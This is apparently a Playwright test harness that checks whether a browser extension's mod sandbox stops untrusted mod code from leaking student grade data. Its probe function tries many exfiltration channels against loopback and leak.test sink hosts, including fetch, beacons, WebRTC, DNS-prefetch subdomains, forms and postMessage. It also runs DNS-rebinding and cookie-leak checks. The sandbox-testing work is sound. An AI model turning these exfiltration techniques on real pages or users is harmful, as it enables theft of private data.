// Real unpacked extension, loopback HTTPS only. NODE_PATH must name an existing Playwright installation.
// One browser at a time; macOS sandbox-exec also denies non-loopback traffic, including browser background traffic.
const { chromium } = require('playwright');
const fs = require('node:fs'), path = require('node:path'), os = require('node:os');
const https = require('node:https'), http = require('node:http'), dgram = require('node:dgram');
const { execFileSync } = require('node:child_process');
const { createHash, X509Certificate } = require('node:crypto');
const assert = require('node:assert/strict');
const env = require('./check-env.js');
const HOSTS = ['https://127.0.0.1/*', 'https://trusted.test/*', 'https://rebind.test/*'];
const ext = env.staged(path.resolve(process.env.EXT || path.join(__dirname, '..')), HOSTS);
const chrome = require('./check-env.js').chromePath() || chromium.executablePath();
const delay = (ms) => new Promise((r) => setTimeout(r, ms));
const until = async (fn, label, ms = 15000) => {
  const end = Date.now() + ms;
  while (Date.now() < end) { const v = await fn(); if (v) return v; await delay(50); }
  throw new Error(`timeout: ${label}`);
};
const listen = (server) => new Promise((res, rej) => { server.once('error', rej); server.listen(0, '127.0.0.1', () => res(server.address().port)); });
const close = (server) => new Promise((res) => { server.close(res); server.closeAllConnections?.(); });

// Runs as fixture mod code, never as extension code. The data Worker learns its marker only from the granted API.
async function battery(secret, mode, sink, plain, stun) {
  const report = { mode, extensionAPI: !!globalThis.chrome?.runtime?.sendMessage, tried: {}, rtc: Object.getOwnPropertyNames(globalThis).filter((k) => /^(webkit)?rtc/i.test(k) && globalThis[k] !== undefined) };
  const url = (ch, base = sink) => `${base}/leak?ch=${ch}&d=${encodeURIComponent(secret)}`;
  const tryIt = (name, fn) => { try { const r = fn(); report.tried[name] = 'attempted'; r?.catch?.(() => {}); } catch (e) { report.tried[name] = e.name; } };
  tryIt('fetch', () => fetch(url('fetch')));
  tryIt('http-fetch', () => fetch(url('http-fetch', plain)));
  tryIt('xhr', () => { const x = new XMLHttpRequest(); x.open('POST', url('xhr')); x.send(secret); });
  tryIt('websocket', () => new WebSocket(url('websocket').replace('https:', 'wss:')));
  tryIt('eventsource', () => new EventSource(url('eventsource')));
  tryIt('beacon', () => navigator.sendBeacon(url('beacon'), secret));
  tryIt('webtransport', () => { const w = new WebTransport(url('webtransport')); w.ready.catch(() => {}); });
  tryIt('webrtc', () => { const pc = new RTCPeerConnection({ iceServers: [{ urls: [`stun:127.0.0.1:${stun}`, `turn:127.0.0.1:${stun}?transport=udp`], username: secret, credential: secret }] }); pc.createDataChannel(secret); return pc.createOffer().then((o) => pc.setLocalDescription(o)); });
  tryIt('worker-fetch', () => {
    const w = new Worker(URL.createObjectURL(new Blob([`fetch(${JSON.stringify(url('worker-fetch'))}).catch(()=>{});postMessage(typeof RTCPeerConnection)`], { type: 'text/javascript' })));
    w.onmessage = (e) => { report.nestedWorkerRTC = e.data; w.terminate(); };
  });
  tryIt('broadcast', () => {
    const b = new BroadcastChannel('mod-probe'); report.broadcastReceived = [];
    b.onmessage = (e) => report.broadcastReceived.push(e.data);
    const timer = setInterval(() => b.postMessage(secret), 100);
    setTimeout(() => { clearInterval(timer); b.close(); }, 1000);
  });
  tryIt('storage', () => { const r = indexedDB.open('mod-probe'); r.onerror = () => {}; });
  if (typeof document === 'undefined') {
    for (const name of ['subresources', 'preconnect', 'dns-prefetch', 'self-navigation', 'window.open', 'postMessage', 'form', 'nested-frame']) report.tried[name] = 'Worker has no document/window';
  } else {
    const add = (tag, props) => { const e = Object.assign(document.createElement(tag), props); document.body.append(e); return e; };
    tryIt('subresources', () => {
      add('img', { src: url('img') }); add('script', { src: url('script') });
      add('link', { rel: 'stylesheet', href: url('stylesheet') });
      add('style', { textContent: `@import url('${url('css-import')}');body{background-image:url('${url('css-url')}')}` });
      new FontFace('leak', `url('${url('font')}')`).load().catch(() => {});
      add('audio', { src: url('audio'), preload: 'auto' }); add('video', { src: url('video'), preload: 'auto' });
      for (const rel of ['prefetch', 'preload', 'modulepreload']) add('link', { rel, as: 'script', href: url(rel) });
    });
    for (const rel of ['preconnect', 'dns-prefetch']) tryIt(rel, () => add('link', { rel, href: sink.replace('127.0.0.1', `${rel}-${mode}-${secret.toLowerCase().replace(/[^a-z0-9]/g, '')}.leak.test`) }));
    tryIt('window.open', () => { report.popup = window.open(url('popup')) === null ? 'blocked' : 'opened'; });
    tryIt('postMessage', () => top.postMessage({ channel: 'mod-probe', secret }, '*'));
    tryIt('form', () => { const f = add('form', { method: 'POST', action: url('form') }); f.submit(); });
    tryIt('nested-frame', () => {
      const f = add('iframe', {});
      try { report.nestedRTC = typeof f.contentWindow.RTCPeerConnection; } catch (e) { report.nestedRTC = e.name; }
    });
    tryIt('storage', () => { localStorage.setItem('mod-probe', secret); report.persistentStorage = true; });
  }
  await new Promise((r) => setTimeout(r, 1200));
  await glaze.storage.set('report', report);
  if (typeof document !== 'undefined') { await glaze.storage.set('navAttempt', true); location.href = url('self-navigation'); }
}

(async () => {
  fs.mkdirSync(path.join(ext, '.sandbox-check'), { recursive: true });
  const tmp = fs.mkdtempSync(path.join(ext, '.sandbox-check', 'run-'));
  let context, lms, sink, rebind, plain, udp, quic, controlQuic, deadline, interrupted = false, diagnostics = async () => ({});
  const interrupt = () => { interrupted = true; context?.close().catch(() => {}); };
  process.once('SIGINT', interrupt); process.once('SIGTERM', interrupt);
  const results = { channels: [], measurements: [], listeners: [], controls: {}, lifecycle: {} };
  let mode = '', hits = [], packets = [], controlQuicPackets = 0;
  try {
    fs.mkdirSync(path.dirname(tmp), { recursive: true });
    const certificate = (name) => {
      const key = path.join(tmp, name + '.key'), cert = path.join(tmp, name + '.cert');
      execFileSync('openssl', ['req', '-x509', '-newkey', 'rsa:2048', '-nodes', '-days', '1', '-subj', '/CN=' + name, '-keyout', key, '-out', cert], { stdio: 'ignore' });
      return { key: fs.readFileSync(key), cert: fs.readFileSync(cert) };
    };
    const tls = certificate('127.0.0.1');
    const spki = createHash('sha256').update(new X509Certificate(tls.cert).publicKey.export({ type: 'spki', format: 'der' })).digest('base64');
    const record = (o) => { hits.push({ mode, ...o }); };
    const onSink = (req, res) => { record({ channel: new URL(req.url, 'http://sink').searchParams.get('ch'), path: req.url, cookie: req.headers.cookie || '', referer: req.headers.referer || '' }); if (req.url.startsWith('/redirect')) { res.writeHead(302, { location: plainUrl + '/leak?ch=redirect-target' }); return res.end(); } res.writeHead(200, { 'access-control-allow-origin': '*', 'content-type': 'text/plain' }); res.end('local sink'); };
    sink = https.createServer(tls, onSink);
    sink.on('secureConnection', (s) => { if (s.servername) record({ channel: 'sni', name: s.servername }); });
    sink.on('upgrade', (req, socket) => { record({ channel: 'websocket', path: req.url }); socket.destroy(); });
    const sinkPort = await listen(sink), sinkUrl = `https://127.0.0.1:${sinkPort}`;
    rebind = https.createServer(certificate('rebind.test'), onSink);
    const rebindPort = await listen(rebind);
    quic = dgram.createSocket('udp4');
    quic.on('message', (p) => packets.push({ mode, channel: 'webtransport', bytes: p.length }));
    await new Promise((r) => quic.bind(sinkPort, '127.0.0.1', r));
    controlQuic = dgram.createSocket('udp4');
    controlQuic.on('message', () => controlQuicPackets++);
    await new Promise((r) => controlQuic.bind(0, '127.0.0.1', r));
    const controlQuicPort = controlQuic.address().port;
    plain = http.createServer(onSink); const plainUrl = `http://127.0.0.1:${await listen(plain)}`;
    udp = dgram.createSocket('udp4');
    udp.on('message', (p) => packets.push({ mode, channel: 'stun', bytes: p.length, head: p.subarray(0, 2).toString('hex') }));
    await new Promise((r) => udp.bind(0, '127.0.0.1', r));
    const stunPort = udp.address().port;
    lms = https.createServer(tls, (req, res) => {
      if (req.url.startsWith('/page-observation')) { record({ channel: 'page-message', path: req.url }); res.end('ok'); return; }
      if (/\/users\/me(?:\?|$)/.test(req.url)) { res.setHeader('content-type', 'application/json'); res.end('{"id":"_900_1"}'); return; }
      if (req.url.startsWith('/api/')) { res.setHeader('content-type', 'application/json'); res.end('[]'); return; }
      const strict = req.url.includes('strict');
      if (strict) res.setHeader('content-security-policy', "default-src 'self'; script-src 'nonce-fixture'; frame-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'none'");
      res.setHeader('content-type', 'text/html');
      res.end(`<!doctype html><html><head><base href="/ultra/"><title>Local LMS</title></head><body><main id="app">Local course</main><script nonce="fixture">
        window.observed=[];window.gaps=[];let last=performance.now();setInterval(()=>{const n=performance.now();gaps.push(n-last);last=n},20);
        addEventListener('message',e=>{if(e.data?.channel==='mod-probe'){observed.push({secret:e.data.secret,origin:e.origin,ports:e.ports.length});fetch('/page-observation?d='+encodeURIComponent(e.data.secret));try{e.source.postMessage({type:'glaze:boot'},'*',[new MessageChannel().port2])}catch{}}});
        window.hostile=()=>({frames:frames.length,iframes:document.querySelectorAll('iframe').length,openShadows:[...document.querySelectorAll('div')].filter(e=>e.shadowRoot).length});
      </script></body></html>`);
    });
    const origin = `https://127.0.0.1:${await listen(lms)}`;
    const profile = path.join(tmp, 'profile'), wrapper = path.join(tmp, 'chrome');
    fs.writeFileSync(path.join(tmp, 'network.sb'), '(version 1)(allow default)(deny network-outbound)(allow network-outbound (remote ip "localhost:*"))');
    const quote = (v) => `'${v.replaceAll("'", "'\\''")}'`;
    fs.writeFileSync(wrapper, `#!/bin/sh\nexec /usr/bin/sandbox-exec -f ${quote(path.join(tmp, 'network.sb'))} ${quote(chrome)} "$@"\n`, { mode: 0o700 });
    await require('./wait-for-browser.js')();
    context = await chromium.launchPersistentContext(profile, { executablePath: wrapper, headless: true, viewport: { width: 1000, height: 700 }, args: [
      `--disable-extensions-except=${ext}`, `--load-extension=${ext}`, `--ignore-certificate-errors-spki-list=${spki}`, '--disable-background-networking', '--disable-component-update', '--no-proxy-server',
      `--host-resolver-rules=MAP *.leak.test 127.0.0.1, MAP trusted.test 127.0.0.1:${sinkPort}, MAP rebind.test 127.0.0.1:${rebindPort}, MAP * ~NOTFOUND, EXCLUDE 127.0.0.1`,
      '--renderer-process-limit=8', '--disable-webgl', '--log-net-log=' + path.join(tmp, 'netlog.json'),
    ] });
    deadline = setTimeout(interrupt, 120000);
    env.noFirstRun(context);
    context.setDefaultTimeout(10000);
    const logs = [];
    const tlsFailures = [];
    context.on('requestfailed', (req) => { if (req.url().startsWith('https://rebind.test/')) tlsFailures.push(req.failure()?.errorText); });
    context.on('console', (m) => { if (logs.length < 100) logs.push(m.type() + ': ' + m.text().slice(0, 500)); });
    context.on('page', (p) => p.on('pageerror', (e) => logs.push('pageerror: ' + e.message)));
    const sw = context.serviceWorkers()[0] || await context.waitForEvent('serviceworker');
    assert.equal(await sw.evaluate((origins) => chrome.permissions.contains({ origins }), HOSTS), true, 'the fixture holds its loopback LMS and broker control hosts before running mods');
    const state = (page) => sw.evaluate(async (url) => {
      const [tab] = await chrome.tabs.query({ url });
      const [r] = await chrome.scripting.executeScript({ target: { tabId: tab.id }, func: () => globalThis.GZ_MODS?.stats() || null });
      return r.result;
    }, page.url());
    diagnostics = async () => ({ logs, pages: await Promise.all(context.pages().map(async (p) => ({ url: p.url(), frames: p.frames().map((f) => f.url()), state: await state(p).catch((e) => String(e)) }))), storage: await sw.evaluate(() => chrome.storage.local.get(['modRuntime', 'modStops', 'modData:abcdefghijklmnop', 'modData:qrstuvwxyz234567'])) });
    const stored = (id, key) => sw.evaluate(async ([id, key]) => (await chrome.storage.local.get(`modData:${id}`))[`modData:${id}`]?.[key], [id, key]);
    const ids = ['abcdefghijklmnop', 'qrstuvwxyz234567', 'aaaaaaaaaaaaaaab', 'aaaaaaaaaaaaaaac', 'aaaaaaaaaaaaaaad'];
    const b64 = (s) => Buffer.from(s).toString('base64');
    const SECRET = 'GLAZE_SECRET_GPA_397_SID_428171', FRAME = 'FRAME_PROBE_ONLY';
    const recordMod = (id, data, active = true) => ({ id, enabled: active, hash: 'fixture', key: 'fixture-key', grants: data ? { grades: true } : {}, manifest: { name: 'Local fixture', permissions: data ? [{ id: 'grades', why: 'test' }] : [], hooks: 'hooks.js', ui: data ? {} : { tiles: [{ id: 'fixture', file: 'ui.html' }] } }, files: { 'hooks.js': b64('void 0'), 'ui.html': b64('<!doctype html><script src="ui.js"></script>'), 'ui.js': b64('void 0') } });
    const install = async (mods) => sw.evaluate(async ({ mods, origin, secret }) => {
      // Keep the host approval between cases. Clearing it briefly unregisters Ultra; a readiness poll could see the
      // old registration just before that queued unregister and load the next page in the gap.
      await chrome.storage.local.remove(Object.keys(await chrome.storage.local.get(null)).filter((k) => k !== 'ultra'));
      // This fixture measures the mod hosts; the ordinary navbar intentionally uses an open shadow root.
      await chrome.storage.sync.set({ enabled: true, enhance: {}, navbar: { on: false } });
      // A frame UI runs in its slot: each frame mod's tile floats over every page (features/widgets.js, features/mods.js).
      const floating = mods.filter((m) => m.manifest.ui.tiles?.length).map((m) => ({ id: `m${m.id.slice(0, 14)}0`, on: true }));
      await chrome.storage.local.set({ ultra: [origin], mods: mods.map((m) => m.id), ...Object.fromEntries(mods.map((m) => [`mod:${m.id}`, m])), [`insights:${origin}/_900_1`]: { at: 1, courses: [{ id: '1', name: secret, trend: [[1, 97]] }] },
        widgetLayout: { boards: { pages: floating } } });
    }, { mods, origin, secret: SECRET }).then(() => env.ultraReady(sw));
    const memory = async () => {
      const cdp = await context.browser().newBrowserCDPSession();
      const { processInfo } = await cdp.send('SystemInfo.getProcessInfo'); await cdp.detach();
      const pids = processInfo.map((p) => p.id);
      const rss = execFileSync('ps', ['-o', 'rss=', '-p', pids.join(',')], { encoding: 'utf8' }).trim().split(/\s+/).reduce((n, s) => n + Number(s), 0) / 1024;
      return { rssMiB: +rss.toFixed(1), processes: pids.length };
    };
    // Listener positive controls live in an ordinary page and are never supplied the Worker secret.
    mode = 'controls';
    const control = await context.newPage(); await control.goto(origin + '/ultra/permissive');
    await control.evaluate(async ({ sinkUrl, stunPort, controlQuicPort }) => {
      await fetch(sinkUrl + '/leak?ch=control');
      const link = document.createElement('link'); link.rel = 'preconnect'; link.href = sinkUrl.replace('127.0.0.1', 'control.leak.test'); document.head.append(link);
      const pc = new RTCPeerConnection({ iceServers: [{ urls: `stun:127.0.0.1:${stunPort}` }] }); pc.createDataChannel('control'); await pc.setLocalDescription(await pc.createOffer()); window.controlRTC = pc; window.controlWT = new WebTransport('https://127.0.0.1:' + controlQuicPort); window.controlWT.ready.catch(()=>{});
    }, { sinkUrl, stunPort, controlQuicPort });
    await until(() => hits.some((h) => h.channel === 'control') && hits.some((h) => h.name === 'control.leak.test') && packets.some(p=>p.channel==='stun') && controlQuicPackets > 0, 'HTTP/TLS/STUN/QUIC listener controls');
    await control.evaluate(() => { const end = performance.now() + 250; while (performance.now() < end) {} });
    await delay(50);
    assert.ok(await control.evaluate(() => Math.max(...gaps)) >= 240, 'page timer detects a real page freeze');
    results.controls = { http: true, tlsSNI: true, stun: true, quic: true, pageTimer: true }; await control.evaluate(()=>{controlRTC.close();controlWT.close()}); await control.close(); await delay(200);
    for (const pageMode of ['strict', 'permissive']) {
      mode = pageMode; hits = []; packets = [];
      const data = recordMod(ids[0], true), frame = recordMod(ids[1], false);
      data.files['hooks.js'] = b64(`glaze.grades().then(g=>(${battery})(g[0].name,'data',${JSON.stringify(sinkUrl)},${JSON.stringify(plainUrl)},${stunPort}));`);
      frame.files['hooks.js'] = b64("try { const bc=new BroadcastChannel('mod-probe');bc.onmessage=e=>glaze.storage.set('crossMod',e.data); } catch {}");
      frame.files['ui.js'] = b64(`glaze.grades().then(()=>glaze.storage.set('dataDenied',false),()=>glaze.storage.set('dataDenied',true));(${battery})(${JSON.stringify(FRAME)},${JSON.stringify('frame-' + pageMode)},${JSON.stringify(sinkUrl)},${JSON.stringify(plainUrl)},${stunPort});`);
      await install([data, frame]);
      const page = await context.newPage(); await page.goto(origin + '/ultra/' + pageMode);
      const dr = await until(() => stored(ids[0], 'report'), 'data Worker report');
      const fr = await until(() => stored(ids[1], 'report'), 'frame UI report');
      await delay(1300);
      assert.equal(await stored(ids[1], 'dataDenied'), true, 'frame never receives grades');
      const discovery = await page.evaluate(() => hostile());
      assert.deepEqual(discovery, { frames: 0, iframes: 0, openShadows: 0 });
      const secretHits = hits.filter((h) => JSON.stringify(h).includes(SECRET) || JSON.stringify(h).includes(SECRET.toLowerCase().replace(/[^a-z0-9]/g, '')));
      assert.equal(secretHits.length, 0, 'Worker data never reaches a listener');
      assert.equal(packets.filter(p=>p.channel==='stun').length, 0, 'no STUN/TURN packets');
      assert.equal(packets.filter(p=>p.channel==='webtransport').length, 0, 'no WebTransport packets');
      assert.equal(dr.rtc.length, 0); assert.equal(fr.rtc.length, 0);
      assert.equal(dr.extensionAPI, false); assert.equal(fr.extensionAPI, false);
      assert.notEqual(await stored(ids[1], 'crossMod'), SECRET, 'no BroadcastChannel data crosses mods');
      assert.ok(!fr.broadcastReceived?.includes(SECRET));
      for (const channel of ['fetch', 'http-fetch', 'xhr', 'websocket', 'eventsource', 'beacon', 'subresources', 'preconnect', 'dns-prefetch', 'webrtc', 'self-navigation', 'window.open', 'postMessage', 'worker-fetch', 'webtransport', 'form', 'nested-frame', 'storage', 'broadcast']) {
        const frameOpen = channel === 'preconnect' ? hits.some((h) => h.channel === 'sni' && h.name?.startsWith('preconnect-')) : channel === 'postMessage' ? hits.some((h) => h.channel === 'page-message') : false;
        results.channels.push({ mode: pageMode, channel, data: 'PASS', reason: dr.tried[channel], frame: frameOpen ? 'OPEN (no data grant)' : 'NO LISTENER HIT', frameAttempt: fr.tried[channel] });
      }
      results.listeners.push({ mode: pageMode, hits, packets, dataReport: dr, frameReport: fr, discovery });
      await page.close();
    }
    mode = 'broker-rebind'; hits = []; packets = [];
    const rebound = recordMod(ids[0], true);
    rebound.manifest.permissions.push({ id: 'network:rebind.test', why: 'loopback DNS regression' }, { id: 'network:trusted.test', why: 'credential and redirect controls' });
    rebound.grants['network:rebind.test'] = true;
    rebound.grants['network:trusted.test'] = true;
    rebound.files['hooks.js'] = b64("glaze.fetch('https://rebind.test/leak?ch=broker-rebind&d=DNS_PROBE').then(r=>glaze.storage.set('rebind',{ok:true,status:r.status}),e=>glaze.storage.set('rebind',{ok:false,error:e.message}));glaze.fetch('https://trusted.test/leak?ch=broker-credentials',{credentials:'include',referrer:'https://127.0.0.1/fixture'}).then(r=>glaze.storage.set('credentials',{ok:true,status:r.status}),e=>glaze.storage.set('credentials',{ok:false,error:e.message}));glaze.fetch('https://trusted.test/redirect?ch=redirect-start').then(()=>glaze.storage.set('redirect','followed'),e=>glaze.storage.set('redirect',e.message));");
    await context.addCookies([{ name: 'modFixture', value: 'must-not-send', url: 'https://trusted.test/', sameSite: 'None', secure: true }]);
    await sw.evaluate(() => fetch('https://trusted.test/leak?ch=cookie-control', { credentials: 'include' }));
    assert.ok(hits.some((h) => h.channel === 'cookie-control' && h.cookie.includes('modFixture=must-not-send')), 'cookie listener positive control');
    results.controls.cookies = true; hits = [];
    await install([rebound]);
    const reboundPage = await context.newPage(); await reboundPage.goto(origin + '/ultra/permissive');
    const reboundAnswer = await until(() => stored(ids[0], 'rebind'), 'broker DNS-rebinding answer');
    assert.deepEqual(reboundAnswer, { ok: false, error: 'network' }, 'untrusted rebound target fails TLS');
    await until(() => tlsFailures.some((e) => /^net::ERR_CERT_/.test(e)), 'rebound certificate error');
    assert.deepEqual(await until(() => stored(ids[0], 'credentials'), 'broker credential answer'), { ok: true, status: 200 });
    const redirect = await until(() => stored(ids[0], 'redirect'), 'redirect answer');
    assert.equal(redirect, 'redirect');
    assert.ok(!hits.some((h) => h.channel === 'redirect-target'));
    const credentialHits = hits.filter((h) => h.channel === 'broker-credentials');
    assert.equal(credentialHits.length, 1, 'credential control reaches its trusted listener');
    assert.ok(credentialHits.every((h) => h.cookie === '' && h.referer === ''));
    results.brokerCredentials = { cookieOmitted: true, referrerOmitted: true, redirectRefused: true };
    results.brokerRebind = { answer: reboundAnswer, tlsFailures, listenerHits: hits.filter((h) => h.channel === 'broker-rebind'), blocked: !hits.some((h) => h.channel === 'broker-rebind') };
    assert.ok(results.brokerRebind.blocked, 'untrusted rebound target receives no HTTP request');
    results.publicAddressSpaceOption = await sw.evaluate(async () => {
      const request = new Request('https://rebind.test/leak?ch=public-option', { targetAddressSpace: 'public', credentials: 'omit' });
      try { return { reflected: request.targetAddressSpace ?? null, status: (await fetch(request)).status }; } catch (e) { return { reflected: request.targetAddressSpace ?? null, error: e.name }; }
    });
    await reboundPage.close();
    mode = 'measure';
    await install([]);
    const empty = await context.newPage(); await empty.goto(origin + '/ultra/permissive'); await delay(600);
    assert.equal(await state(empty), null, 'no enabled code mod: runtime stays unloaded');
    const baseline = await memory(); await empty.close();
    for (const count of [1, 5]) {
      await install(ids.slice(0, count).map((id, i) => recordMod(id, i === 0)));
      const page = await context.newPage(); await page.goto(origin + '/ultra/permissive');
      const s = await until(async () => { const s = await state(page); return s && Object.keys(s.ready).length === count && s; }, `${count} mods ready`);
      await delay(500);
      const mem = await memory();
      results.measurements.push({ mods: count, readyMs: Math.max(...Object.values(s.ready)), navigationReadyMs: +(s.began + Math.max(...Object.values(s.ready))).toFixed(1), ...mem, deltaRssMiB: +(mem.rssMiB - baseline.rssMiB).toFixed(1) });
      await page.close();
    }
    const busy = recordMod(ids[1], false), survivor = recordMod(ids[0], true);
    busy.files['ui.js'] = b64('setTimeout(()=>{const end=performance.now()+6500;while(performance.now()<end){}},500)');
    await install([busy, survivor]);
    const page = await context.newPage(); await page.goto(origin + '/ultra/permissive');
    await until(async () => (await state(page))?.gone?.[ids[1]], 'busy frame stopped by watchdog');
    const maxGap = await page.evaluate(() => Math.max(...gaps));
    results.busyFrame = { pageMaxGapMs: +maxGap.toFixed(1), pageResponsive: maxGap < 500, state: await state(page) };
    assert.ok(results.busyFrame.pageResponsive, 'busy frame leaves LMS responsive');
    await page.close();
    busy.files['ui.js'] = b64('setTimeout(()=>{while(true){}},500)');
    survivor.files['hooks.js'] = b64("glaze.storage.get('starts').then(n=>glaze.storage.set('starts',(n||0)+1));");
    await install([busy, survivor]);
    const hung = await context.newPage(); await hung.goto(origin + '/ultra/permissive');
    await until(async () => (await state(hung))?.gone?.[ids[1]], 'permanently busy frame removed');
    let recovered = false;
    try { await until(async () => (await stored(ids[0], 'starts')) >= 2, 'Worker restarts after infinite frame', 12000); recovered = true; } catch {}
    results.infiniteFrame = { recovered, state: await state(hung), pageMaxGapMs: await hung.evaluate(() => Math.max(...gaps)) };
    await hung.close();
    await install([survivor]);
    const reload = await context.newPage(); await reload.goto(origin + '/ultra/permissive');
    await until(async () => (await state(reload))?.running, 'host before extension reload');
    const dom = await context.newCDPSession(reload);
    const hostCount = async () => {
      const { root } = await dom.send('DOM.getDocument', { depth: -1, pierce: true });
      const count = (n) => (n.nodeName === 'IFRAME' && n.attributes?.some((a) => a.includes('mods/host.html')) ? 1 : 0) + [...(n.children || []), ...(n.shadowRoots || [])].reduce((v, c) => v + count(c), 0);
      return count(root);
    };
    const before = await hostCount();
    await sw.evaluate(() => chrome.runtime.reload()).catch(() => {});
    await delay(2700);
    results.reload = { before, after: await hostCount() };
    assert.equal(before, 1); assert.equal(results.reload.after, 0, 'extension reload removes the old sandbox');
    await reload.close();
    results.baseline = baseline;
    console.log(JSON.stringify(results, null, 2));
    if (!results.brokerRebind.blocked || !results.infiniteFrame.recovered) process.exitCode = 1;
    else console.log(`mods-sandbox-check: ${results.channels.length} channel cases, broker controls and watchdog recovery passed`);
  } catch (e) {
    console.error('PARTIAL_RESULTS ' + JSON.stringify({ ...results, currentPackets: packets, currentHits: hits }));
    console.error('DIAGNOSTICS ' + JSON.stringify(await diagnostics().catch((e) => ({ error: String(e) }))));
    throw e;
  } finally {
    clearTimeout(deadline);
    await context?.close();
    udp?.close(); quic?.close(); controlQuic?.close();
    await Promise.all([lms, sink, rebind, plain].filter(Boolean).map(close));
    fs.rmSync(tmp, { recursive: true, force: true });
    console.log('Cleanup: owned browser, listeners and profile removed');
  }
})().catch((e) => { console.error(e.stack); process.exitCode = 1; });
